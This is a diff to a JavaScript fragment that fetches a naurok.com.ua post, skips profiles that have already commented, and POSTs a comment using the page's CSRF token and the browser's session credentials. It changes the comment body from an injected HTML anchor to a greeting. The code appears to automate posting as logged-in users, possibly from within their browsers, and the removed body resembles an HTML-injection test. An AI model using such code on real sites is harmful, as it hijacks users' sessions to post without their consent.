@@ -58,7 +58,7 @@
         const commentP = await fetch('https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya');
     
         const text2 = await commentP.text();
-        if (text2.includes(`href="/profile/${profileId}"`)) return console.log('already commented');
+        if (text2.includes(`href="/profile/${profileId}"`)) return;
         const m = text2.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);
         if (!m) return;
         const e = m[1];
@@ -80,7 +80,7 @@
             },
             "referrer": "https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya",
             "referrerPolicy": "strict-origin-when-cross-origin",
-            "body": `_csrf=${csrf}${amp}CommentModel[content]=<a href="/"></a>${amp}CommentModel[parentId]=${amp}CommentModel[url]=/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya`,
+            "body": `_csrf=${csrf}${amp}CommentModel[content]=Привіт${amp}CommentModel[parentId]=${amp}CommentModel[url]=/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya`,
             "method": "POST",
             "mode": "cors",
             "credentials": "include"
